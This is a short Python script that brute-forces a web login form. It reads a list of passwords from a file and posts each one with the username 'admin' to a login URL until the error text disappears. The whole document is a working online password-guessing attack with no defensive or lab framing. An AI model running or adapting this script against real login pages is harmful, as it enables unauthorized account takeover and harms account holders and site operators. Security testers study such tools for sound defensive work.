import requests

target_url = "http://example.com/login"

username_field = "username"
password_field = "password"

with open("passwords.txt", "r") as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    payload = {
        username_field: "admin",
        password_field: password
    }
    response = requests.post(target_url, data=payload)
    if "Incorrect password" not in response.text:
        print("Password found:", password)
        break
